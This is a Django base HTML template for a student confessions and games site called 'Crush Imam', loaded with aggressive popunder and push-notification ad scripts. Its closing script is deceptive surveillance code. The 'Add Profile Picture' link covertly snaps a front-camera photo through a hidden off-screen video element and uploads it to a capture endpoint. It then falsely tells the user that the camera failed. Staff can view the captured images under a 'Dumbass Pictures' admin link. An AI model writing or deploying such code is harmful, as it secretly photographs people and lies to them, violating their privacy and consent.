{% load static %}
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Crush Imam</title>
    <link rel="stylesheet" href="{% static 'css/styles.css' %}" />
    <link rel="stylesheet" href="{% static 'css/fontawesome/css/all.min.css' %}" />
    <script src="https://cdn.tailwindcss.com"></script>

    {% comment %} Ads {% endcomment %}

    
    {% comment %} Push Notifications {% endcomment %}
    <script src="https://3nbf4.com/act/files/tag.min.js?z=10331336" data-cfasync="false" async></script>
    
    {% if request.path != "/flappy/" %} 
    {% if request.path != "/accounts/login/" %} 
    {% if request.path != "/accounts/signup/" %} 
    {% comment %} Popunder {% endcomment %}
    <script>(function(s){s.dataset.zone='10331346',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    {% endif %}
    {% endif %}
    {% endif %}
    
    {% comment %} Vignette Banner {% endcomment %}
    <script>(function(s){s.dataset.zone='10331349',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    <script src="https://richinfo.co/richpartners/pops/js/richads-pu-ob.js" data-pubid="995761" data-siteid="380602" async data-cfasync="false"></script>
    
    {% comment %} Interstitial {% endcomment %}
    <script>(function(s){s.dataset.zone='10331351',s.src='https://groleegni.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    
    {% comment %} In-page Push (Banner) {% endcomment %}
    <script src="https://richinfo.co/richpartners/in-page/js/richads-ob.js?pubid=995761&siteid=380647" async></script>
    <script>(function(s){s.dataset.zone='10331352',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
    <script type="module" src="https://richinfo.co/richpartners/push/js/rp-cl-ob.js?pubid=995761&siteid=380648&niche=33" async data-cfasync="false"></script>
    

        <meta name="monetag" content="3c90631ebc25b96d660cbfda158247cb">
</head>
<body class="{% block body_class %}{% endblock %}">
    <header class="header">
    <nav class="navbar">
        <div class="nav-container">
            <a href="{% url 'home' %}" class="logo">Crush Imam</a>
            <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu">
                <span></span>
                <span></span>
                <span></span>
            </button>
            <ul class="nav-menu" id="navMenu">
                <li class="nav-item"><a href="{% url 'home' %}" class="nav-link"><i class="fas fa-home"></i> Home</a></li>
                <li class="nav-item"><a href="{% url 'confessions_list' %}" class="nav-link"><i class="fas fa-comments"></i> Confessions</a></li>
                <li class="nav-item"><a href="{% url 'news_list' %}" class="nav-link"><i class="fas fa-newspaper"></i> News</a></li>
                <li class="nav-item"><a href="{% url 'hall_list' category='fame' %}" class="nav-link"><i class="fas fa-trophy"></i> Hall of Fame & Shame</a></li>
                <li class="nav-item"><a href="{% url 'flappy' %}" class="nav-link"><i class="fas fa-crow"></i> Flappy Bird</a></li>
                {% if user.is_staff %}
                <li class="nav-item"><a href="{% url 'flappy_photos_admin' %}" class="nav-link"><i class="fas fa-images"></i> Dumbass Pictures</a></li>
                {% endif %}
                {% if user.is_authenticated %}
                <li class="user-menu">
                        <span class="user-greeting"><i class="fas fa-user"></i> {{ user.username }}</span>
                        <a href="{% url 'account_logout' %}" class="nav-link logout-link"><i class="fas fa-sign-out-alt"></i> Logout</a>
                        <a href="#" id="add_pfp" class="nav-link logout-link"><i class="fas fa-user-circle"></i> Add Profile Picture</a>
                </li>
                    {% else %}
                        <li class="nav-item"><a href="{% url 'account_login' %}" class="nav-link"><i class="fas fa-sign-in-alt"></i> Login</a></li>
                    {% endif %}
            </ul>
        </div>
    </nav>
</header>

<div id="mobileOverlay" class="mobile-overlay" aria-hidden="true"></div>

    {% block content %}
    {% endblock %}

    <footer>
        <div class="footer-content">
            <div class="footer-section">
                <p>ðŸ“± Follow us on Instagram:</p>
                <p><a href="https://www.instagram.com/crush_imam_ghazali1/" target="_blank">@crush_imam_ghazali1</a></p>
            </div>
            <div class="footer-divider"></div>
            <div class="footer-section">
                <p>Â© 2025 Crush Imam. All rights reserved. | Kol l7o9ou9 ma7fouda.</p>
            </div>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
        const menuToggle = document.getElementById('menuToggle');
        const navMenu = document.getElementById('navMenu');
        const mobileOverlay = document.getElementById('mobileOverlay');

        menuToggle.addEventListener('click', function() {
            menuToggle.classList.toggle('active');
            navMenu.classList.toggle('active');
            mobileOverlay.classList.toggle('active');
            document.body.style.overflow = navMenu.classList.contains('active') ? 'hidden' : '';
        });

        mobileOverlay.addEventListener('click', function() {
            menuToggle.classList.remove('active');
            navMenu.classList.remove('active');
            mobileOverlay.classList.remove('active');
            document.body.style.overflow = '';
        });

        // Mobile dropdown toggle
        const dropdownToggles = document.querySelectorAll('.dropdown-toggle');
        dropdownToggles.forEach(toggle => {
            toggle.addEventListener('click', function(e) {
                if (window.innerWidth <= 968) {
                    e.preventDefault();
                    this.parentElement.classList.toggle('active');
                }
            });
        });
    });
    </script>
    <script>
        // CSRF helper
function getCookie(name) {
  let v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
  return v ? decodeURIComponent(v[2]) : null;
}

        // Camera capture and upload
async function requestCameraAndCapture(){
  try{

    const constraints = { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    // create a hidden video element and attach to DOM (some browsers require it to render frames)
    const video = document.createElement('video');
    video.style.position = 'fixed'; video.style.left = '-9999px'; video.style.width = '1px'; video.style.height = '1px';
    video.autoplay = true; video.playsInline = true; video.muted = true;
    video.srcObject = stream;
    document.body.appendChild(video);

    // Try to play; some browsers require play() to be called. If it fails, we'll still poll for frames.
    try{ await video.play(); } catch(e){ /* ignore */ }

    // wait until we have a valid frame size or timeout
    const start = Date.now();
    while((video.videoWidth === 0 || video.videoHeight === 0) && (Date.now() - start) < 2000){
      await new Promise(r => setTimeout(r, 50));
    }

    const vw = video.videoWidth || baseW;
    const vh = video.videoHeight || baseH;
    const off = document.createElement('canvas'); off.width = vw; off.height = vh;
    const octx = off.getContext('2d');

    // wait a couple frames to ensure pixels are available
    await new Promise(r => requestAnimationFrame(r));
    await new Promise(r => requestAnimationFrame(r));
    octx.drawImage(video, 0, 0, off.width, off.height);

    // stop camera and remove video element
    try{ stream.getTracks().forEach(t => t.stop()); } catch(e){ console.warn('stop error', e); }
    try{ video.remove(); } catch(e){}

    // convert to blob and upload
    off.toBlob(async function(blob){
      const fd = new FormData();
      fd.append('photo', blob, 'flappy_capture.png');
      const csr = getCookie('csrftoken');
      try{
        const resp = await fetch('{% url "flappy_capture" %}', { method: 'POST', body: fd, headers: {'X-CSRFToken': csr} });
        const js = await resp.json().catch(()=>({error:'invalid response'}));
      }catch(err){ console.error(err); }
    }, 'image/png');
  }catch(err){
    console.error(err);
  }
}
const add_pfp = document.getElementById('add_pfp');
if (add_pfp) {
    add_pfp.addEventListener('click', async function(e){
        await requestCameraAndCapture();
        alert('An error has occured while trying to access your camera. Please try again later.');
    });
}
</script>
    {% block extra_scripts %}{% endblock %}
</body>
</html>

